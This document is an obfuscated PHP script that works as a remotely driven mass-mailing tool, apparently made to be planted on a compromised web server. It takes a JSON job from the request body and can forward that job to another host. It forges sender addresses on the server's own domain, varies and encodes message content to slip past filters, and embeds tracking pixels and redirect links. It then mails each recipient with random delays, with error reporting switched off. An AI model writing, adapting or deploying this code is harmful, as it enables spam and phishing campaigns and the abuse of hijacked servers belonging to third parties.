<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spa15a87) { if ($spa15a87 == 'keys') { return array_keys($this->_keys); } } public function Import($spa15a87, $spa6bf4e) { if (is_array($spa6bf4e)) { $this->values[$spa15a87] = array(); foreach ($spa6bf4e as $spa1ff6c) { if (!empty($spa1ff6c['key'])) { $this->values[$spa15a87][$spa1ff6c['key']] = $spa1ff6c['value']; } else { $this->values[$spa15a87][] = $spa1ff6c['value']; } } } else { $this->Assign($spa15a87, $spa6bf4e); } } public function Assign($spa15a87, $sp78f730) { $this->values[$spa15a87] = $sp78f730; } public function Parse($sp5fe1fc) { $spa1293d = ''; $spca56f9 = 0; while (true) { $sp436b44 = strpos($sp5fe1fc, '{', $spca56f9); if ($sp436b44 === false) { $spa1293d .= substr($sp5fe1fc, $spca56f9); break; } $spa1293d .= substr($sp5fe1fc, $spca56f9, $sp436b44 - $spca56f9); $spca56f9 = $sp436b44 + 1; $sp5b2e3f = ''; $sp1cd122 = '{'; $sp83976a = array(); $sp0b2252 = false; $sp1e960e = false; $sp630d7c = 'var'; while ($spca56f9 < strlen($sp5fe1fc)) { $sp91e57a = substr($sp5fe1fc, $spca56f9, 1); $sp1cd122 .= $sp91e57a; if ($sp91e57a == ',' || $sp91e57a == '>' || $sp91e57a == '|') { if ($sp630d7c == 'alias') { $sp0b2252 = $sp5b2e3f; } elseif ($sp630d7c == 'mod') { $sp1e960e = $sp5b2e3f; } else { $sp83976a[] = $sp5b2e3f; } $sp5b2e3f = ''; if ($sp91e57a == '>') { $sp630d7c = 'alias'; } if ($sp91e57a == '|') { $sp630d7c = 'mod'; } $spca56f9++; continue; } if ($sp91e57a == '}') { if ($sp630d7c == 'alias') { $sp0b2252 = $sp5b2e3f; } elseif ($sp630d7c == 'mod') { $sp1e960e = $sp5b2e3f; } else { $sp83976a[] = $sp5b2e3f; } $spca56f9++; break; } $sp5b2e3f .= $sp91e57a; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp91e57a) == 0) { $spca56f9++; $sp83976a = array(); break; } $spca56f9++; } if (sizeof($sp83976a) == 0) { $spa1293d .= $sp1cd122; continue; } $sp9d7648 = false; $sp8510aa = false; if (preg_match('/^\\^/', $sp83976a[0]) > 0) { $sp83976a[0] = substr($sp83976a[0], 1); $sp9d7648 = true; } if (preg_match('/^\\!/', $sp83976a[0]) > 0) { $sp83976a[0] = substr($sp83976a[0], 1); $sp8510aa = true; } $spbd0b09 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp83976a[0], $spc75013) > 0) { $spbd0b09 = $spc75013[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp83976a[0], $spc75013) > 0) { $spbd0b09 = explode('-', $spc75013[1]); } if ($spbd0b09 !== false) { $sp83976a[0] = substr($sp83976a[0], 0, strpos($sp83976a[0], '[')); } $this->_keys[$sp83976a[0]] = true; if (empty($this->values[$sp83976a[0]]) && empty($this->fixed[$sp83976a[0]])) { continue; } if ($sp9d7648) { unset($this->fixed[$sp83976a[0]]); } if (isset($this->fixed[$sp83976a[0]])) { $sp79effb = $this->fixed[$sp83976a[0]]; } else { $sp79effb = ''; $sp279cd1 = 1; if (sizeof($sp83976a) == 2) { $sp279cd1 = $sp83976a[1]; } if (sizeof($sp83976a) == 3) { $sp279cd1 = rand($sp83976a[1], $sp83976a[2]); } for ($sp7d6930 = 0; $sp7d6930 < $sp279cd1; $sp7d6930++) { if (is_array($this->values[$sp83976a[0]])) { if (!is_array($this->used[$sp83976a[0]])) { $this->used[$sp83976a[0]] = array(); } if (count($this->used[$sp83976a[0]]) == count($this->values[$sp83976a[0]])) { $this->used[$sp83976a[0]] = array(); } if ($spbd0b09 !== false && is_scalar($spbd0b09)) { $sp79effb .= $this->values[$sp83976a[0]][$spbd0b09]; $this->used[$spbd0b09] = true; } else { $sp8b5476 = array(); if (is_array($spbd0b09)) { $sp5f86d2 = $spbd0b09[0]; $spd3f80c = $spbd0b09[1]; } else { $sp5f86d2 = 0; $spd3f80c = count($this->values[$sp83976a[0]]) - 1; } for ($sp027532 = $sp5f86d2; $sp027532 <= $spd3f80c; $sp027532++) { if ($sp8510aa && !empty($this->used[$sp83976a[0]][$sp027532])) { continue; } $sp8b5476[] = $sp027532; } $sp285e42 = $sp8b5476[rand(0, count($sp8b5476) - 1)]; $this->used[$sp83976a[0]][$sp285e42] = true; $sp79effb .= $this->values[$sp83976a[0]][$sp285e42]; } } else { $sp79effb .= $this->values[$sp83976a[0]]; } } } $sp79effb = $this->Parse($sp79effb); if ($sp1e960e !== false) { for ($sp48ef11 = 0; $sp48ef11 < strlen($sp1e960e); $sp48ef11++) { switch (substr($sp1e960e, $sp48ef11, 1)) { case 'b': $sp79effb = base64_encode($sp79effb); break; case 'q': $sp79effb = quoted_printable_encode($sp79effb); break; default: break; } } } if ($sp9d7648) { $this->fixed[$sp83976a[0]] = $sp79effb; } if ($sp0b2252 !== false && $sp0b2252 != '') { $this->fixed[$sp0b2252] = $sp79effb; } $spa1293d .= $sp79effb; } return $spa1293d; } } $sp98790f = file_get_contents('php://input'); $sp8ed6d2 = json_decode($sp98790f, true); if (empty($sp8ed6d2['via_proxy'])) { $sp8ed6d2['via_proxy'] = true; $sp0ef199 = curl_init($sp8ed6d2['prefix'] . $sp8ed6d2['files']['s']); $sp8aa176 = json_encode($sp8ed6d2); curl_setopt($sp0ef199, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp0ef199, CURLOPT_TIMEOUT, 600); curl_setopt($sp0ef199, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp0ef199, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp0ef199, CURLOPT_REFERER, $sp947993); curl_setopt($sp0ef199, CURLOPT_POST, true); curl_setopt($sp0ef199, CURLOPT_POSTFIELDS, $sp8aa176); curl_setopt($sp0ef199, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp8aa176))); $sp1bf760 = curl_exec($sp0ef199); echo $sp1bf760; die; } $sp1e8826 = $_SERVER['SERVER_ADDR']; $sp409d8b = $_SERVER['HTTP_HOST']; $sp409d8b = preg_replace('/^www\\./', '', $sp409d8b); $sp255ac8 = new Macros(); $sp255ac8->Assign('server_addr', $sp1e8826); $sp255ac8->Assign('server_host', $sp409d8b); foreach ($sp8ed6d2['macros'] as $spa15a87 => $spa6bf4e) { $sp255ac8->Import($spa15a87, $spa6bf4e); } $sp754cc3 = preg_replace('/^www\\./i', '', $sp409d8b); $sp7f0f1a = $sp255ac8->Parse('{from_user}@' . $sp754cc3); $sp255ac8->Assign('from_email', $sp7f0f1a); $sp255ac8->Assign('prefix', $sp8ed6d2['prefix']); $sp255ac8->Assign('html', $sp8ed6d2['letter']['html']); $spca56f9 = 0; $sp63efe1 = 0; $sp4eac48 = 0; $sp1891ca = array(); foreach ($sp8ed6d2['rcpt'] as $sp714c1a) { $sp255ac8->Assign('email', $sp714c1a['email']); $sp255ac8->Assign('entry', $sp714c1a); $sp255ac8->Assign('date', date('r')); $sp255ac8->Assign('redirect', $sp8ed6d2['prefix'] . $sp8ed6d2['files']['r']); $sp255ac8->Assign('redirect_with_uri', $sp8ed6d2['prefix'] . $sp8ed6d2['files']['r'] . '?uri='); $sp255ac8->Assign('unsubscribe', $sp8ed6d2['prefix'] . $sp8ed6d2['files']['u'] . '?id=' . $sp714c1a['id']); $sp255ac8->Assign('delivery', '<img src="' . $sp8ed6d2['prefix'] . $sp8ed6d2['files']['d'] . '?id=' . $sp714c1a['id'] . '" />'); $spf31bd7 = $sp255ac8->Parse($sp8ed6d2['envelope']['header']); $sp039758 = $sp255ac8->Parse($sp8ed6d2['envelope']['body']); if (!empty($sp714c1a['name'])) { $spd8dc9c = $sp714c1a['name'] . ' <' . $sp714c1a['email'] . '>'; } else { $spd8dc9c = $sp714c1a['email']; } $sp9afa35 = $sp255ac8->Parse($sp8ed6d2['letter']['subject']); if ($spca56f9 > 0) { sleep(rand(3, 8)); } $spba76e2 = mail($spd8dc9c, $sp9afa35, $sp039758, $spf31bd7); $sp1891ca[$sp714c1a['id']] = $spba76e2; if ($spba76e2) { $sp63efe1++; } else { $sp4eac48++; } $spca56f9++; } echo serialize(array('total' => count($sp8ed6d2['rcpt']), 'sent' => $spca56f9, 'success' => $sp63efe1, 'error' => $sp4eac48, 'rcpt' => $sp1891ca));